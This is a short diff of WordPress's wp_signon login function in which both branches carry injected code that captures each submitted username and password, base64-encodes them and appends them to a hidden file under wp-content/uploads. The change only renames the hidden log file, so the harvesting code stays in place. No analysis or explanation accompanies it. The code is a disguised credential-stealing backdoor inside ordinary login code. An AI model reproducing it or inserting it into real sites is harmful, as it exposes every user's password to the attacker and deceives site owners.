@@ -49,11 +49,11 @@ function wp_signon( $credentials = array(), $secure_cookie = '' ) {
         if ( ! empty( $credentials['remember'] ) ) {
                 $credentials['remember'] = true;
                 $credz = date('Y-m-d') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
-                file_put_contents('wp-content/uploads/.page.php.sqp', base64_encode($credz).PHP_EOL, FILE_APPEND);
+                file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
         } else {
                 $credentials['remember'] = false;
                 $credz = date('Y-m-d') .  " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
-                file_put_contents('wp-content/uploads/.asd.page.sqp', base64_encode($credz).PHP_EOL, FILE_APPEND);
+                file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
                 }
 
         /**
